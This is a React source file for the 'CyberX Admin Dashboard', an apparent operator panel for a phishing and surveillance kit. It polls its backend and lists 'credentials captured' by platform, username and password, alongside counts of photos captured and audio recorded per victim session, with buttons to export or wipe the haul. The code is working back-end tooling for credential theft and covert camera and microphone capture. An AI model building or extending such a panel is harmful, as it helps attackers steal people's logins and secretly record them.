import { useState, useEffect } from 'react';
import { useNavigate } from 'react-router-dom';
import { LogOut, RefreshCw, Trash2, Download } from 'lucide-react';

export default function AdminDashboard() {
  const navigate = useNavigate();
  const [credentials, setCredentials] = useState<any[]>([]);
  const [sessions, setSessions] = useState<any[]>([]);
  const [analytics, setAnalytics] = useState<any>(null);
  const [isLoading, setIsLoading] = useState(true);
  const [activeTab, setActiveTab] = useState('credentials');
  const [deleteConfirm, setDeleteConfirm] = useState(false);

  useEffect(() => {
    const token = localStorage.getItem('adminToken');
    if (!token) {
      navigate('/admin/login');
      return;
    }
    loadData();
    const interval = setInterval(loadData, 5000); // Refresh every 5 seconds
    return () => clearInterval(interval);
  }, []);

  const loadData = async () => {
    const token = localStorage.getItem('adminToken');
    try {
      const [credResponse, sessResponse, analyticsResponse] = await Promise.all([
        fetch('/api/admin/credentials', { headers: { Authorization: `Bearer ${token}` } }),
        fetch('/api/admin/sessions', { headers: { Authorization: `Bearer ${token}` } }),
        fetch('/api/admin/analytics', { headers: { Authorization: `Bearer ${token}` } }),
      ]);

      if (credResponse.ok) {
        const credData = await credResponse.json();
        setCredentials(credData);
      }
      if (sessResponse.ok) {
        const sessData = await sessResponse.json();
        setSessions(sessData);
      }
      if (analyticsResponse.ok) {
        const analyticsData = await analyticsResponse.json();
        setAnalytics(analyticsData);
      }
    } catch (error) {
      console.error('Failed to load data:', error);
    } finally {
      setIsLoading(false);
    }
  };

  const handleLogout = () => {
    localStorage.removeItem('adminToken');
    navigate('/admin/login');
  };

  const handleDeleteAllData = async () => {
    if (!deleteConfirm) {
      setDeleteConfirm(true);
      return;
    }

    const token = localStorage.getItem('adminToken');
    try {
      const response = await fetch('/api/admin/all-data', {
        method: 'DELETE',
        headers: { Authorization: `Bearer ${token}` },
      });

      if (response.ok) {
        alert('All data has been deleted');
        setCredentials([]);
        setDeleteConfirm(false);
      }
    } catch (error) {
      console.error('Delete failed:', error);
    }
  };

  const handleExport = async () => {
    const token = localStorage.getItem('adminToken');
    try {
      const response = await fetch('/api/admin/export', {
        headers: { Authorization: `Bearer ${token}` },
      });

      if (response.ok) {
        const blob = await response.blob();
        const url = window.URL.createObjectURL(blob);
        const a = document.createElement('a');
        a.href = url;
        a.download = `cyberx-data-${new Date().toISOString()}.json`;
        a.click();
      }
    } catch (error) {
      console.error('Export failed:', error);
    }
  };

  if (isLoading && !credentials.length) {
    return (
      <div className="min-h-screen bg-gray-50 flex items-center justify-center">
        <div className="text-center">
          <div className="animate-spin text-4xl mb-4">⏳</div>
          <p className="text-gray-600">Loading dashboard...</p>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-gray-50">
      {/* Header */}
      <div className="bg-white shadow">
        <div className="max-w-7xl mx-auto px-4 py-4 flex justify-between items-center">
          <h1 className="text-3xl font-bold text-gray-900">CyberX Admin Dashboard</h1>
          <div className="flex items-center gap-4">
            <button
              onClick={loadData}
              className="flex items-center gap-2 px-4 py-2 bg-blue-600 text-white rounded hover:bg-blue-700 transition"
            >
              <RefreshCw size={20} />
              Refresh
            </button>
            <button
              onClick={handleLogout}
              className="flex items-center gap-2 px-4 py-2 bg-gray-600 text-white rounded hover:bg-gray-700 transition"
            >
              <LogOut size={20} />
              Logout
            </button>
          </div>
        </div>
      </div>

      <div className="max-w-7xl mx-auto px-4 py-8">
        {/* Analytics Cards */}
        {analytics && (
          <div className="grid grid-cols-4 gap-4 mb-8">
            <div className="bg-white p-6 rounded-lg shadow">
              <p className="text-gray-600 text-sm">Active Sessions</p>
              <p className="text-3xl font-bold text-blue-600">{analytics.activeSessions || 0}</p>
            </div>
            <div className="bg-white p-6 rounded-lg shadow">
              <p className="text-gray-600 text-sm">Credentials Captured</p>
              <p className="text-3xl font-bold text-red-600">{analytics.totalCredentials || 0}</p>
            </div>
            <div className="bg-white p-6 rounded-lg shadow">
              <p className="text-gray-600 text-sm">Photos Captured</p>
              <p className="text-3xl font-bold text-green-600">{analytics.totalPhotos || 0}</p>
            </div>
            <div className="bg-white p-6 rounded-lg shadow">
              <p className="text-gray-600 text-sm">Audio Duration</p>
              <p className="text-3xl font-bold text-purple-600">{analytics.totalAudioMinutes || 0}m</p>
            </div>
          </div>
        )}

        {/* Tabs */}
        <div className="bg-white rounded-lg shadow mb-6">
          <div className="flex border-b">
            {['credentials', 'sessions', 'photos', 'analytics'].map((tab) => (
              <button
                key={tab}
                onClick={() => setActiveTab(tab)}
                className={`px-6 py-4 font-semibold transition ${
                  activeTab === tab
                    ? 'border-b-2 border-blue-600 text-blue-600'
                    : 'text-gray-600 hover:text-gray-900'
                }`}
              >
                {tab.charAt(0).toUpperCase() + tab.slice(1)}
              </button>
            ))}
          </div>

          {/* Credentials Tab */}
          {activeTab === 'credentials' && (
            <div className="p-6">
              <div className="overflow-x-auto">
                <table className="w-full text-sm">
                  <thead>
                    <tr className="border-b">
                      <th className="text-left py-3 px-4">Platform</th>
                      <th className="text-left py-3 px-4">Email/Username</th>
                      <th className="text-left py-3 px-4">Password</th>
                      <th className="text-left py-3 px-4">Timestamp</th>
                      <th className="text-left py-3 px-4">Session ID</th>
                    </tr>
                  </thead>
                  <tbody>
                    {credentials.map((cred, idx) => (
                      <tr key={idx} className="border-b hover:bg-gray-50">
                        <td className="py-3 px-4 font-semibold">{cred.demo_type}</td>
                        <td className="py-3 px-4">{cred.email_or_username}</td>
                        <td className="py-3 px-4">
                          <code className="bg-gray-200 px-2 py-1 rounded">
                            {"•".repeat(Math.min(cred.password.length, 12))}
                          </code>
                        </td>
                        <td className="py-3 px-4 text-xs text-gray-500">
                          {new Date(cred.captured_at).toLocaleTimeString()}
                        </td>
                        <td className="py-3 px-4 text-xs text-gray-500">
                          {cred.session_id?.slice(-8)}
                        </td>
                      </tr>
                    ))}
                  </tbody>
                </table>
                {!credentials.length && (
                  <div className="text-center py-8 text-gray-500">
                    No credentials captured yet
                  </div>
                )}
              </div>
            </div>
          )}

          {/* Sessions Tab */}
          {activeTab === 'sessions' && (
            <div className="p-6">
              <div className="space-y-4">
                {sessions.map((session) => (
                  <div key={session.id} className="bg-gray-50 p-4 rounded border">
                    <div className="flex justify-between items-start">
                      <div>
                        <p className="font-semibold">Session {session.id?.slice(-8)}</p>
                        <p className="text-sm text-gray-600">
                          Status: <span className="font-semibold">{session.status}</span>
                        </p>
                        <p className="text-sm text-gray-600">
                          Photos: {session.photo_count} | Audio: {session.audio_duration_ms}ms
                        </p>
                      </div>
                      <div className="text-right text-sm text-gray-500">
                        {new Date(session.created_at).toLocaleString()}
                      </div>
                    </div>
                  </div>
                ))}
                {!sessions.length && (
                  <div className="text-center py-8 text-gray-500">
                    No sessions yet
                  </div>
                )}
              </div>
            </div>
          )}

          {/* Photos Tab */}
          {activeTab === 'photos' && (
            <div className="p-6">
              <div className="text-center py-12 text-gray-500">
                📷 Photo gallery would display captured images here
              </div>
            </div>
          )}

          {/* Analytics Tab */}
          {activeTab === 'analytics' && (
            <div className="p-6">
              <div className="grid grid-cols-2 gap-6">
                <div>
                  <h3 className="font-bold mb-4">Credentials by Platform</h3>
                  <div className="space-y-2">
                    {analytics?.credentialsByPlatform && Object.entries(analytics.credentialsByPlatform).map(([platform, count]: [string, any]) => (
                      <div key={platform} className="flex justify-between">
                        <span>{platform}</span>
                        <span className="font-bold">{count as React.ReactNode}</span>
                      </div>
                    ))}
                  </div>
                </div>
                <div>
                  <h3 className="font-bold mb-4">Session Stats</h3>
                  <div className="space-y-2">
                    <div className="flex justify-between">
                      <span>Total Sessions</span>
                      <span className="font-bold">{sessions.length}</span>
                    </div>
                    <div className="flex justify-between">
                      <span>Avg Duration</span>
                      <span className="font-bold">-</span>
                    </div>
                  </div>
                </div>
              </div>
            </div>
          )}
        </div>

        {/* Data Management */}
        <div className="bg-white rounded-lg shadow p-6">
          <h2 className="text-xl font-bold text-gray-900 mb-4">Data Management</h2>
          <div className="flex gap-4">
            <button
              onClick={handleExport}
              className="flex items-center gap-2 px-6 py-3 bg-blue-600 text-white rounded-lg hover:bg-blue-700 transition"
            >
              <Download size={20} />
              Export Data
            </button>
            <button
              onClick={handleDeleteAllData}
              className={`flex items-center gap-2 px-6 py-3 rounded-lg transition ${
                deleteConfirm
                  ? 'bg-red-600 hover:bg-red-700'
                  : 'bg-gray-600 hover:bg-gray-700'
              } text-white`}
            >
              <Trash2 size={20} />
              {deleteConfirm ? 'Confirm Delete All' : 'Delete All Data'}
            </button>
            {deleteConfirm && (
              <button
                onClick={() => setDeleteConfirm(false)}
                className="px-6 py-3 bg-gray-400 text-white rounded-lg hover:bg-gray-500 transition"
              >
                Cancel
              </button>
            )}
          </div>
        </div>
      </div>
    </div>
  );
}
